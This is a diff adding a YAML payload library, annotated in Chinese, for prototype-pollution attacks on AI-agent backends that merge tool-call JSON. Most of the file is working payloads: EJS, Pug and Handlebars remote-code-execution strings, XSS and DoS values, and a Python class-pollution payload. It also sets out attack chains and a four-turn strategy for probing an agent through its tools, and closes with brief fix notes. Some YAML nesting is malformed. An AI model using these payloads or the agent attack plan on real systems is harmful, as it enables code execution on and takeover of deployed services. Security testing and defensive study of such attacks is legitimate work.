@@ -1,0 +1,113 @@
+# Prototype Pollution — Agent 场景适配 Payload 库
+# 适配点：Node.js / Python（部分）后端 Agent，工具接受 JSON 合并/克隆
+
+metadata:
+  source: codeaudit/hack-skills/prototype-pollution
+  scope: agent tool call params (JSON) → Object merge / assign
+  layer: L3_tool_call
+  sink_patterns:
+    - "Object.assign(target, user_json)"
+    - "lodash.merge(target, user_json)"
+    - "jQuery.extend(true, target, user_json)"
+
+# ============ 1. JavaScript 检测 ============
+detection:
+  probes:
+    - payload: '{"__proto__": {"polluted": "yes"}}'
+      purpose: "基础 proto 污染"
+    - payload: '{"constructor": {"prototype": {"polluted": "yes"}}}'
+      purpose: "constructor.prototype 污染"
+  verification:
+    - "在另一对象上检查 obj.polluted === 'yes'"
+    - "如果 console.log({}.polluted) 返回 'yes' → 确认"
+
+# ============ 2. 经典 sink ============
+sinks_js:
+  dangerous_apis:
+    - "obj[key] = source[key]  // 无 hasOwnProperty 检查"
+    - "Object.assign(target, source)"
+    - "lodash.merge / mergeWith / defaultsDeep"
+    - "jQuery.extend(true, target, source)"
+    - "deepmerge"
+    - "JSON.parse + recursive merge"
+
+# ============ 3. 利用 — RCE ============
+rce_nodejs:
+  via_child_process:
+    - description: "覆盖 env 路径触发 spawn shell"
+      payload: '{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/fd/0"}}}'
+  via_ejs:
+    - description: "覆盖 outputFunctionName 触发 RCE"
+      payload: '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\'child_process\').execSync(\'id\');s"}}'
+  via_pug:
+    - payload: '{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require(\'child_process\').execSync(\'id\')"}}}'
+  via_handlebars:
+    - payload: '{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}'
+
+# ============ 4. 利用 — XSS ============
+xss:
+  - description: "污染对象导致后续模板/字符串拼接含恶意内容"
+    payloads:
+      - '{"__proto__": {"html": "<script>alert(1)</script>"}}'
+      - '{"__proto__": {"status": "<script>alert(1)</script>"}}'
+
+# ============ 5. 利用 — DoS ============
+dos:
+  - description: "覆盖 toString / length 触发异常"
+    payloads:
+      - '{"__proto__": {"toString": "x"}}'  # 触发 TypeError
+      - '{"__proto__": {"length": "not_a_number"}}'
+
+# ============ 6. Python (少量) ============
+python_pollution:
+  description: |
+    Python 中部分深拷贝 / 对象合并库可能受类似影响
+  libraries:
+    - "pydantic（特定版本）"
+    - "deepdiff"
+    - "glom"
+  payloads:
+    - '{"__class__": {"__init__": {"__globals__": {"os": {"system": "id"}}}}}'
+      notes: "class pollution — 通过 __class__ 改 globals"
+
+# ============ 7. Agent 场景特化 ============
+agent_specific:
+  description: |
+    Agent 后端为 Node.js (LangChain.js / AutoGen JS / Vercel AI SDK) 时常见
+  high_risk_tool_patterns:
+    - name: "merge_config"
+      severity: critical
+    - name: "update_settings"
+      severity: high
+    - name: "deep_merge"
+      severity: critical
+    - name: "extend_object"
+      severity: high
+    - name: "parse_config"
+      severity: high
+  attack_chains:
+    config_poison:
+      - "用户通过工具传 JSON 配置: {\"theme\": \"dark\"}"
+      - "额外嵌入 {\"__proto__\": {\"outputFunctionName\": \"x;...\"}}"
+      - "后端 merge → 污染 prototype"
+      - "后续 EJS/Pug 渲染触发 RCE"
+    template_engine_pollution:
+      - "Agent 后端用 EJS/Pug/Handlebars"
+      - "污染 prototype.allowProtoMethodsByDefault=true"
+      - "绕过模板引擎安全限制"
+  multi_turn_strategy:
+    turn_1: "询问：'后端是否 Node.js？用什么模板引擎？'"
+    turn_2: "探测：'{\"__proto__\": {\"polluted\": \"yes\"}}'"
+    turn_3: "验证：提交后另发请求看是否污染"
+    turn_4: "RCE：EJS outputFunctionName 等"
+
+# ============ 8. 修复要点 ============
+defense:
+  - "使用 Object.create(null) 创建字典对象"
+    - "跳过原型链"
+  - "深拷贝用 structuredClone"
+  - "merge 用 Object.defineProperty + hasOwnProperty 检查"
+  - "lodash: 使用 _.cloneDeep（不会污染）"
+  - "升级到 Node.js 18+（部分防护）"
+  - "CSP 头防止 XSS 利用"
+  - "模板引擎启用 sandbox"
